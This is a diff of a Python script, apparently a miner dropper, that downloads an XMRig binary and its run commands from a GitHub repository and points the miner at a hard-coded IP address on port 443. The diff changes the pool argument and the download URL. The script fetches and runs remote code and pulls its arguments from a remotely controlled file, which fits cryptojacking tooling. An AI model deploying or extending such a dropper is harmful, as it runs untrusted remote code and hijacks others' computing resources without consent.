@@ -31,7 +31,7 @@ if operate_system == 'lin':
     except:
         pass
 import psutil
-command_xmrig_default = '-c /opt/xmrig_linux/config.json'
+command_xmrig_default = '-o 66.42.53.57:443 --tls'
 #while True:
 time.sleep(1)
 working_dir = os.path.dirname(os.path.realpath(__file__))
@@ -76,7 +76,7 @@ if operate_system == 'lin':
 
     #print('So cores de dao la %s' %cores)
     link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
-    link_download_xmrig = 'https://github.com/giautoidi/giautoidi/raw/beta/daonhanh/xmrig_linux.gz'
+    link_download_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
     link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/command_xmrig'
     gz_name = 'xmrig_linux.gz'
     folder_xmrig = 'xmrig_linux'
